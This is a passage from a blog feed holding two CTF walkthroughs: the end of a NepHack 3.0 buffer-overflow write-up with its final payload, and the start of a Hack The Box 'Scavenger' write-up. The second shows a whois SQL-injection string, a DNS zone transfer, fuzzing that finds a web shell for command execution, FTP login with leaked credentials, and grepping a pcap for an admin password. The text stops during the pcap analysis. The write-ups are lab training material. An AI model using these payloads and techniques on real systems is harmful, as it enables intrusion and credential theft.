&lt;p&gt;Fig:-&lt;em&gt;Into hacker shell&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;I am able to login hacker shell and since I was in tty shell I had to spawn that shell so I used&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~$python -c &quot;&quot;import pty;pty.spawn(‘/bin/bash’)&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As challenge have given a description about the location at /hom/pax and I got two files.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/public/images/docker1.png&quot; alt=&quot;docker1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Fig:- &lt;em&gt;hacker_shell&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;one is vuln executable and other is flag.txt which doesn’t have permission to read .Since vuln file is ELF file so I generally read that file with gdb but my bad organizer doesn’t have gdb installed in that shell. So first I have to download that file to my localhost for that I used scp&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~$scp hacker@iZa2dh0wn9s9aolc3csaudZ:/home/pax /root/Downloads/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;this way I was able to download to my localhost and I had given the execute permission to that file.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~$chmod +x vuln
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I had gdb install so used this command to read vuln file&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~$gdb -q vuln
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/public/images/gdb_shell.png&quot; alt=&quot;gdb&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Fig:- &lt;em&gt;vuln run normally&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;nothing happened there and I entered many random text and I got &lt;code class=&quot;highlighter-rouge&quot;&gt;segmented fault&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/public/images/sigfault.png&quot; alt=&quot;sigfault&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, I had to find the offset after which &lt;code class=&quot;highlighter-rouge&quot;&gt;SIGSEGV&lt;/code&gt; fault occurred. I mostly use one of my favorite method to find offset as&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@root:$ /usr/share/metasploit framework/tools/exploit/./pattern_create.rb -l 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

root@root:$ /usr/share/metasploit-framework/tools/exploit/./pattern_offset.rb -q 0x0000555555554830
[*] Exact match at offset 40
This way I got the offset. Then, I had to find the function where flag is located. For that I searched every functions and got this
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/public/images/function_shell.png&quot; alt=&quot;function&quot; /&gt;&lt;/p&gt;

&lt;p&gt;fig:-&lt;em&gt;Functions names&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;there I got &lt;code class=&quot;highlighter-rouge&quot;&gt;fLog()&lt;/code&gt; function as noticeable and had to find the address of this function as&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/public/images/address_log.png&quot; alt=&quot;address&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Fig:- &lt;em&gt;Address of fLog&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Since that is the address before running the file and after running I got this&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/public/images/fLog_function.png&quot; alt=&quot;address&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Fig:-&lt;em&gt;Address of fLog after running file&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Since all the address should be used in &lt;code class=&quot;highlighter-rouge&quot;&gt;Little Endian&lt;/code&gt; format. There is small story about &lt;code class=&quot;highlighter-rouge&quot;&gt;Little Endian&lt;/code&gt; if you are interested you can read from &lt;a href=&quot;https://www.ling.upenn.edu/courses/Spring_2003/ling538/Lecnotes/ADfn1.htm&quot;&gt;here&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Address is &lt;code class=&quot;highlighter-rouge&quot;&gt;0x8a4755555555&lt;/code&gt; in Little Endian format and&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;offset = 40&lt;/p&gt;

  &lt;p&gt;address to call = 8a4755555555&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;So my final payload was:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~$python -c “print(‘A’*40 + ‘\x8a\x47\x55\x55\x55\x55’)” | ./vuln
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/public/images/final_one.png&quot; alt=&quot;flag&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Fig:- &lt;em&gt;Flag&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;This way I got the flag as &lt;code class=&quot;highlighter-rouge&quot;&gt;cynical_flag{hacker_kto_mah}&lt;/code&gt; and got 495 points.&lt;/p&gt;

&lt;p&gt;I wanted to thank all readers for being with me through my post and I will be posting other walkthrough of NepHack 3.0 challenges soon.
At last, I would like to acknowledge brother &lt;a href=&quot;https://twitter.com/maskop9&quot;&gt;@maskop9&lt;/a&gt; for helping through out the competition and other helping hands along with the organizer Cynical Technology for awesome platform seems like they too have bugbounty platform as bugv.io :)&lt;/p&gt;</content><author><name>gr4n173&gt;</name></author><category term="linux" /><category term="nephack3" /><category term="ctf" /><category term="binaryexploitation" /><category term="gdb" /><category term="pwnables" /><summary type="html">Introduction</summary></entry><entry><title type="html">Hack The Box: Scavenger</title><link href="http://localhost:4000/2020/02/29/htb-scavenger.html" rel="alternate" type="text/html" title="Hack The Box: Scavenger" /><published>2020-02-29T00:00:00+05:45</published><updated>2020-02-29T00:00:00+05:45</updated><id>http://localhost:4000/2020/02/29/htb-scavenger</id><content type="html" xml:base="http://localhost:4000/2020/02/29/htb-scavenger.html">&lt;hr /&gt;
&lt;h1 id=&quot;htbscavenger&quot;&gt;HTB:Scavenger&lt;/h1&gt;

&lt;p&gt;Scavenger box was the hardest box after &lt;a href=&quot;https://gr4n173.github.io/2020/02/22/htb-zetta.html&quot;&gt;Zetta&lt;/a&gt; box. It falls under linux and hard category. Here, everything was all about enumeration, enumeration and enumeration. I’ll approach this write-up how I solved it, along with the problems that I had to face during this box. At first I obtained the user flag using &lt;code class=&quot;highlighter-rouge&quot;&gt;whois&lt;/code&gt; service and dns zone transfer(axfr) along with ftp by analyzing the .pcap file then used LKM to read root.txt. I’ll show all my payload (including that didn’t work in initial deployment to get root).&lt;/p&gt;

&lt;h1 id=&quot;box-details&quot;&gt;Box Details&lt;/h1&gt;

&lt;p&gt;&lt;img src=&quot;/public/images/Scavenger_description.png&quot; alt=&quot;scavenger_description&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In above picture it’s ip is 10.10.10.155, I added it to /etc/hosts as scavenger.htb. Let’s solve this box.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;recon&quot;&gt;Recon&lt;/h1&gt;

&lt;p&gt;Let’s start with our universal port scanner, &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to see the open port and service which shows&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Nmap 7.80 scan initiated Thu Feb 27 23:24:41 2020 as: nmap -sS -sV -sC -Pn -oN nmap.txt 10.10.10.155
Nmap scan report for www.supersechosting.htb (10.10.10.155)
Host is up (0.29s latency).
Not shown: 993 filtered ports
PORT   STATE  SERVICE  VERSION
20/tcp closed ftp-data
21/tcp open   ftp      vsftpd 3.0.3
22/tcp open   ssh      OpenSSH 7.4p1 Debian 10+deb9u4 (protocol 2.0)
| ssh-hostkey: 
|   2048 df:94:47:03:09:ed:8c:f7:b6:91:c5:08:b5:20:e5:bc (RSA)
|   256 e3:05:c1:c5:d1:9c:3f:91:0f:c0:35:4b:44:7f:21:9e (ECDSA)
|_  256 45:92:c0:a1:d9:5d:20:d6:eb:49:db:12:a5:70:b7:31 (ED25519)
25/tcp open   smtp     Exim smtpd 4.89
| smtp-commands: ib01.supersechosting.htb Hello www.supersechosting.htb [10.10.14.243], SIZE 52428800, 8BITMIME, PIPELINING, PRDR, HELP, 
|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP 
43/tcp open   whois?
| fingerprint-strings: 
|   GenericLines, GetRequest, HTTPOptions, Help, RTSPRequest: 
|     % SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
|     more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
|     This query returned 0 object
|   SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     % SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
|     more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
|_    1267 (HY000): Illegal mix of collations (utf8mb4_general_ci,IMPLICIT) and (utf8_general_ci,COERCIBLE) for operation 'like'
53/tcp open   domain   ISC BIND 9.10.3-P4 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Debian
80/tcp open   http     Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: SuperSecHosting
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port43-TCP:V=7.80%I=7%D=2/27%Time=5E57FEF1%P=x86_64-pc-linux-gnu%r(Gene
SF:ricLines,A9,&quot;%\x20SUPERSECHOSTING\x20WHOIS\x20server\x20v0\.6beta@Maria
SF:DB10\.1\.37\r\n%\x20for\x20more\x20information\x20on\x20SUPERSECHOSTING
SF:,\x20visit\x20http://www\.supersechosting\.htb\r\n%\x20This\x20query\x2
SF:0returned\x200\x20object\r\n&quot;)%r(GetRequest,A9,&quot;%\x20SUPERSECHOSTING\x2
SF:0WHOIS\x20server\x20v0\.6beta@MariaDB10\.1\.37\r\n%\x20for\x20more\x20i
SF:nformation\x20on\x20SUPERSECHOSTING,\x20visit\x20http://www\.supersecho
SF:sting\.htb\r\n%\x20This\x20query\x20returned\x200\x20object\r\n&quot;)%r(HTT
SF:POptions,A9,&quot;%\x20SUPERSECHOSTING\x20WHOIS\x20server\x20v0\.6beta@Maria
SF:DB10\.1\.37\r\n%\x20for\x20more\x20information\x20on\x20SUPERSECHOSTING
SF:,\x20visit\x20http://www\.supersechosting\.htb\r\n%\x20This\x20query\x2
SF:0returned\x200\x20object\r\n&quot;)%r(RTSPRequest,A9,&quot;%\x20SUPERSECHOSTING\x
SF:20WHOIS\x20server\x20v0\.6beta@MariaDB10\.1\.37\r\n%\x20for\x20more\x20
SF:information\x20on\x20SUPERSECHOSTING,\x20visit\x20http://www\.supersech
SF:osting\.htb\r\n%\x20This\x20query\x20returned\x200\x20object\r\n&quot;)%r(He
SF:lp,A9,&quot;%\x20SUPERSECHOSTING\x20WHOIS\x20server\x20v0\.6beta@MariaDB10\.
SF:1\.37\r\n%\x20for\x20more\x20information\x20on\x20SUPERSECHOSTING,\x20v
SF:isit\x20http://www\.supersechosting\.htb\r\n%\x20This\x20query\x20retur
SF:ned\x200\x20object\r\n&quot;)%r(SSLSessionReq,103,&quot;%\x20SUPERSECHOSTING\x20W
SF:HOIS\x20server\x20v0\.6beta@MariaDB10\.1\.37\r\n%\x20for\x20more\x20inf
SF:ormation\x20on\x20SUPERSECHOSTING,\x20visit\x20http://www\.supersechost
SF:ing\.htb\r\n1267\x20\(HY000\):\x20Illegal\x20mix\x20of\x20collations\x2
SF:0\(utf8mb4_general_ci,IMPLICIT\)\x20and\x20\(utf8_general_ci,COERCIBLE\
SF:)\x20for\x20operation\x20'like'&quot;)%r(TerminalServerCookie,103,&quot;%\x20SUPE
SF:RSECHOSTING\x20WHOIS\x20server\x20v0\.6beta@MariaDB10\.1\.37\r\n%\x20fo
SF:r\x20more\x20information\x20on\x20SUPERSECHOSTING,\x20visit\x20http://w
SF:ww\.supersechosting\.htb\r\n1267\x20\(HY000\):\x20Illegal\x20mix\x20of\
SF:x20collations\x20\(utf8mb4_general_ci,IMPLICIT\)\x20and\x20\(utf8_gener
SF:al_ci,COERCIBLE\)\x20for\x20operation\x20'like'&quot;)%r(TLSSessionReq,103,&quot;
SF:%\x20SUPERSECHOSTING\x20WHOIS\x20server\x20v0\.6beta@MariaDB10\.1\.37\r
SF:\n%\x20for\x20more\x20information\x20on\x20SUPERSECHOSTING,\x20visit\x2
SF:0http://www\.supersechosting\.htb\r\n1267\x20\(HY000\):\x20Illegal\x20m
SF:ix\x20of\x20collations\x20\(utf8mb4_general_ci,IMPLICIT\)\x20and\x20\(u
SF:tf8_general_ci,COERCIBLE\)\x20for\x20operation\x20'like'&quot;);
Service Info: Host: ib01.supersechosting.htb; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Feb 27 23:26:45 2020 -- 1 IP address (1 host up) scanned in 123.59 seconds

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;web-enumeration&quot;&gt;Web Enumeration&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;scavenger.htb&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;After I noticed &lt;code class=&quot;highlighter-rouge&quot;&gt;port&lt;/code&gt; 80 was opened I visited that site and got this as output.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/public/images/scavenger_frontpage.jpg&quot; alt=&quot;scavenger_frontpage&quot; /&gt;&lt;/p&gt;

&lt;p&gt;From above picture, I got an vhost config problem which indicated hostname problem now I had to find another hostname. For that, I went back to &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan where I got &lt;code class=&quot;highlighter-rouge&quot;&gt;6&lt;/code&gt; opened port and searched every opened port for vulnerability but got nothing since all were rabbit hole except port &lt;code class=&quot;highlighter-rouge&quot;&gt;43&lt;/code&gt; of &lt;code class=&quot;highlighter-rouge&quot;&gt;whois&lt;/code&gt; service. 
		You can visit here for more about &lt;a href=&quot;https://www.commandlinux.com/man-page/man1/whois.1.html&quot;&gt;whois&lt;/a&gt;. From this I made simple payload.&lt;/p&gt;

&lt;h3 id=&quot;sqli-in-whois-service&quot;&gt;Sqli in WHois Service&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~$ whois -h 10.10.10.155 -p 43 &quot;scavenger.htb&quot;
% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
% This query returned 0 object
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;From here I got new domain name and added that domain name in &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; in same ip &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.155&lt;/code&gt;. After adding that Ip I visited that site and got this as result.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/public/images/supersechosting.jpg&quot; alt=&quot;supersechosting_page&quot; /&gt;&lt;/p&gt;

&lt;p&gt;this way I can browse a website. Here, I got nothing so I had to search more about &lt;code class=&quot;highlighter-rouge&quot;&gt;whois&lt;/code&gt; service. I made payload to inject sqli in whois service to extract the files from database as.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n174:~$ whois -h 10.10.10.155 -p 43 &quot;l33t') or 1=1#&quot;
 SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
% This query returned 4 object
   Domain Name: SUPERSECHOSTING.HTB
   Registrar WHOIS Server: whois.supersechosting.htb
   Registrar URL: http://www.supersechosting.htb
   Updated Date: 2018-02-21T18:36:40Z 
   Creation Date: 1997-09-15T04:00:00Z
   Registry Expiry Date: 2020-09-14T04:00:00Z
   Registrar: SuperSecHosting Inc.
   Registrar IANA ID: 292
   Registrar Abuse Contact Email: abusecomplaints@supersechosting.htb
   Registrar Abuse Contact Phone: +1.999999999
   Name Server: NS1.SUPERSECHOSTING.HTB
   DNSSEC: unsigned
   URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/
&amp;gt;&amp;gt;&amp;gt; Last update of whois database: 2018-12-05T14:11:05Z &amp;lt;&amp;lt;&amp;lt;

For more information on Whois status codes, please visit https://icann.org/epp

NOTICE: The expiration date displayed in this record is the date the
registrar's sponsorship of the domain name registration in the registry is
currently set to expire. This date does not necessarily reflect the expiration
date of the domain name registrant's agreement with the sponsoring
registrar.  Users may consult the sponsoring registrar's Whois database to
view the registrar's reported date of expiration for this registration.

TERMS OF USE: You are not authorized to access or query our Whois
database through the use of electronic processes that are high-volume and
automated except as reasonably necessary to register domain names or
modify existing registrations; the Data in VeriSign Global Registry
.......
........

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;This command extract everything that was saved in database using SQL Injection in &lt;code class=&quot;highlighter-rouge&quot;&gt;WHOIS&lt;/code&gt; service since &lt;code class=&quot;highlighter-rouge&quot;&gt;WHOIS&lt;/code&gt; service always needs to use database to store and extract the information.&lt;/p&gt;

&lt;p&gt;From above output of WHOIS command I got three more &lt;code class=&quot;highlighter-rouge&quot;&gt;dns&lt;/code&gt; as&lt;code class=&quot;highlighter-rouge&quot;&gt; www.justanotherblog.htb&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;www.pwnhats.htb&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;www.rentahacker.htb&lt;/code&gt; and I immediately added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt;. After that I can browser every website of it and final dns in &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; was&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~$ cat /etc/hosts
10.10.10.155    www.pwnhats.htb www.rentahacker.htb www.justanotherblog.htb www.supersechosting.htb
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h3 id=&quot;justanotherbloghtb&quot;&gt;justanotherblog.htb&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/public/images/justanotherblog.jpg&quot; alt=&quot;justanotherblog&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;pwnhatshtb&quot;&gt;pwnhats.htb&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/public/images/pwnhats.jpg&quot; alt=&quot;pwnhats&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;rentahackerhtb&quot;&gt;rentahacker.htb&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/public/images/rentahacker.jpg&quot; alt=&quot;rentahacker.htb&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I searched every part of three website and basic method of Web Pentesting . Since there were many website of same ip so I used dns zone transfer (axfr) to know the subdomains and dig every domain as &lt;code class=&quot;highlighter-rouge&quot;&gt;dig @10.10.10.155 pwnhats.htb axfr&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;dig @10.10.10.155 rentahacker.htb axfr&lt;/code&gt;I got new subdomain of rentahacker.htb . For more info about dig you can visit &lt;a href=&quot;https://linuxize.com/post/how-to-use-dig-command-to-query-dns-in-linux/&quot;&gt;dig&lt;/a&gt;.&lt;/p&gt;

&lt;h3 id=&quot;subdomain-enumeration&quot;&gt;Subdomain Enumeration&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n174:~$ dig @10.10.10.155 rentahacker.htb axfr
; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.11.5-P4-5-Debian &amp;lt;&amp;lt;&amp;gt;&amp;gt; @10.10.10.155 rentahacker.htb axfr                                                                                 
; (1 server found)                                                                                                                                    
;; global options: +cmd                                                                                                                               
rentahacker.htb.        604800  IN      SOA     ns1.supersechosting.htb. root.supersechosting.htb. 4 604800 86400 2419200 604800                      
rentahacker.htb.        604800  IN      NS      ns1.supersechosting.htb.                                                                              
rentahacker.htb.        604800  IN      MX      10 mail1.rentahacker.htb.                                                                             
rentahacker.htb.        604800  IN      A       10.10.10.155                                                                                          
mail1.rentahacker.htb.  604800  IN      A       10.10.10.155                                                                                          
sec03.rentahacker.htb.  604800  IN      A       10.10.10.155                                                                                          
www.rentahacker.htb.    604800  IN      A       10.10.10.155                                                                                          
rentahacker.htb.        604800  IN      SOA     ns1.supersechosting.htb. root.supersechosting.htb. 4 604800 86400 2419200 604800                      
;; Query time: 883 msec
;; SERVER: 10.10.10.155#53(10.10.10.155)
;; WHEN: Fri Feb 28 00:09:07 +0545 2020
;; XFR size: 8 records (messages 1, bytes 251)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Since 10.10.10.155 was ip here I used it as name server and rentahacker.htb as a url for dns zone transfer using axfr. Now &lt;code class=&quot;highlighter-rouge&quot;&gt;sec03.rentahacker.htb&lt;/code&gt; was added in &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt;too.&lt;/p&gt;

&lt;h3 id=&quot;sec03rentahackerhtb&quot;&gt;sec03.rentahacker.htb&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/public/images/sec03_page.jpg&quot; alt=&quot;sec03page&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After that, I searched for directory using dirsearch as&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~$ ./dirsearch.py -u http://sec03.rentahacker.htb/ -e html,txt,php,pcap,bzip,tar,bak

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Here I got &lt;code class=&quot;highlighter-rouge&quot;&gt;shell.php&lt;/code&gt; as an interesting dir. Then, searched for parameter in &lt;code class=&quot;highlighter-rouge&quot;&gt;shell.php?FUZZ=&lt;/code&gt; where I used ffuf tool .&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~$ffuf -w ~/Downloads/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -u http://sec03.rentahacker.htb/shell.php?FUZZ=id                                                                                                        
                                                                                                                                                      
        /'___\  /'___\           /'___\                                                                                                               
       /\ \__/ /\ \__/  __  __  /\ \__/                                                                                                               
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\                                                                                                              
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/                                                                                                              
         \ \_\   \ \_\  \ \____/  \ \_\                                                                                                               
          \/_/    \/_/   \/___/    \/_/                                                                                                               
                                                                                                                                                      
       v0.12                                                                                                                                          
________________________________________________                                                                                                      
                                                                                                                                                      
 :: Method           : GET                                                                                                                            
 :: URL              : http://sec03.rentahacker.htb/shell.php?FUZZ=id                                                                              
 :: Follow redirects : false                                                                                                                          
 :: Calibration      : false                                                                                                                          
 :: Timeout          : 10                                                                                                                             
 :: Threads          : 40                                                                                                                             
 :: Matcher          : Response status: 200,204,301,302,307,401,403                                                                                   
________________________________________________                                                                                                      
                                                                                                                                                      
password                [Status: 200, Size: 0, Words: 1, Lines: 1]                                                                                    
email                   [Status: 200, Size: 0, Words: 1, Lines: 1]                                                                                    
url                     [Status: 200, Size: 0, Words: 1, Lines: 1]                                                                                    
type                    [Status: 200, Size: 0, Words: 1, Lines: 1]
.....
hidden                  [Status: 200, Size: 61, Words: 3, Lines: 2]                                                                                   
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;From here I got &lt;code class=&quot;highlighter-rouge&quot;&gt;hidden&lt;/code&gt; as parameter and got &lt;code class=&quot;highlighter-rouge&quot;&gt;ib01c03&lt;/code&gt; as output in browser. This indicated I can now run commands from the browser. You can see the output below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/public/images/shell_page.png&quot; alt=&quot;shell_page&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;rce-as-ib01c03&quot;&gt;RCE as ib01c03&lt;/h2&gt;
&lt;h3 id=&quot;users-ib01c03-ib01ftp-ib01c01&quot;&gt;Users: ib01c03-&amp;gt;ib01ftp-&amp;gt;ib01c01&lt;/h3&gt;

&lt;p&gt;After getting web-shell I searched every possible part of that user and finally got mail in &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/mail/&lt;/code&gt; directory i.e. &lt;code class=&quot;highlighter-rouge&quot;&gt;ib01c03&lt;/code&gt; with my &lt;code class=&quot;highlighter-rouge&quot;&gt;cat&lt;/code&gt; I got this&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/public/images/credentials.png&quot; alt=&quot;credentials&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You can see the credentials username/password. I used that user/pass 
to login ftp and I m into ib01ftp user now.&lt;/p&gt;

&lt;h3 id=&quot;ftp&quot;&gt;FTP&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;ib01ftp-&amp;gt;ib01c01-&amp;gt;user.txt&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~$ ftp www.supersechosting.htb
Connected to www.supersechosting.htb.
220 (vsFTPd 3.0.3)
Name (www.supersechosting.htb:bikram): ib01ftp
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&amp;gt; ls
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;After alot searched in every directory I got &lt;code class=&quot;highlighter-rouge&quot;&gt;incidents&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;ibo1c01_incident.pcap&lt;/code&gt; file inside &lt;code class=&quot;highlighter-rouge&quot;&gt;ib01c01&lt;/code&gt;. Then downloaded it to my local machine for that I used below command.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ftp&amp;gt; get ib01c01_incident.pcap
local: ib01c01_incident.pcap remote: ib01c01_incident.pcap
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for ib01c01_incident.pcap (835084 bytes).
226 Transfer complete.
835084 bytes received in 6.58 secs (123.9393 kB/s)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;You can get .pcap file here: &lt;a href=&quot;/public/files/ib01c01_incident.pcap&quot;&gt;pcap&lt;/a&gt;. It would be a great idea if we try strings for .pcap file so I analyzed .pcap file with &lt;code class=&quot;highlighter-rouge&quot;&gt;strings&lt;/code&gt; and got this result.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~$ strings ib01c01_incident.pcap | grep passwd
ajax=1&amp;amp;token=&amp;amp;controller=AdminLogin&amp;amp;submitLogin=1&amp;amp;passwd=pwnhats.htb&amp;amp;email=admin%40pwnhats.htb&amp;amp;redirect=http%3A%2F%2Fwww.pwnhats.htb%2Fadmin530o6uisg%2F%26token%3De44d0ae2213d01986912abc63712a05b
                                                &amp;lt;label class=&quot;control-label&quot; for=&quot;passwd&quot;&amp;gt;
                                                &amp;lt;input name=&quot;passwd&quot; type=&quot;password&quot; id=&quot;passwd&quot; class=&quot;form-control&quot; value=&quot;&quot; tabindex=&quot;2&quot; placeholder=&quot;&amp;amp;#xf084 Password&quot; /&amp;gt;
